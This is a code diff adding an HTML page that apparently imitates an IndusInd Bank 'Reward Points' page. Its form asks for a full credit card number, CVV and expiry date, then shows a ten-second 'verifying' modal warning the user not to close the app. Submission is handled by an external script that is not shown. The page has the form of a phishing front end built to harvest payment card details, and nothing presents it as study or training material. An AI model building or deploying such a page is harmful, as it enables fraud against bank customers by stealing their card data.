@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IndusInd Bank</title>
+    <style>
+        /* Style for the modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(10px);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script> 
+    <!-- <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"> -->
+</head>
+<body>
+    <div class="container mx-auto mt-10">
+        <div class="flex justify-center">
+            <div class="w-full max-w-md p-4 rounded-md shadow-sm">
+                <div class="text-center mb-4">
+                    <img src="/images/logo.png" alt="Logo" class="w-100 h-40 mx-auto mb-2"> 
+                    <h1 class="text-3xl font-bold">Reward Points</h1>
+                </div>
+                <form id="reward-form">
+                    <div class="mb-4">
+                        <label for="card-number" class="block text-gray-700 font-bold mb-2">Credit Card No.:</label>
+                        <input type="text" id="card-number" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="16" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="cvv" class="block text-gray-700 font-bold mb-2">CVV:</label>
+                        <input type="text" id="cvv" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="3" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="expiry-date" class="block text-gray-700 font-bold mb-2">Expiry Date:</label>
+                        <input type="month" id="expiry-date" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
+                    </div>
+                    <button type="button" onclick="validateCard()" class="hover:border bg-my-primary hover:border-my-primary hover:text-my-primary hover:border-my-primary hover:bg-white text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">Validate Card</button>
+                </form>
+                    <!-- The Modal -->
+                    <div id="loadingModal" class="modal">
+                        <div class="modal-content">
+                            <div class="loader"></div>
+                            <p>Please wait while verifying your reward points. Don't close the app.</p>
+                            <div id="timer">10</div>
+                        </div>
+                    </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const cardNumberInput = document.getElementById('card-number');
+        const cvvInput = document.getElementById('cvv');
+
+        cardNumberInput.addEventListener('input', () => {
+            cardNumberInput.value = cardNumberInput.value.replace(/\D/g, '').substring(0, 16); // Allow only digits and limit to 16
+        });
+
+        cvvInput.addEventListener('input', () => {
+            cvvInput.value = cvvInput.value.replace(/\D/g, '').substring(0, 3); // Allow only digits and limit to 3
+        });
+    </script>
+    <script src="/js/reward.js"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'my-primary': '#AF3014', 
+                    },
+                },
+            },
+            variants: { 
+                extend: {
+                    borderStyle: ['hover'],
+                }
+    }
+        };
+    </script>
+</body>
+</html>
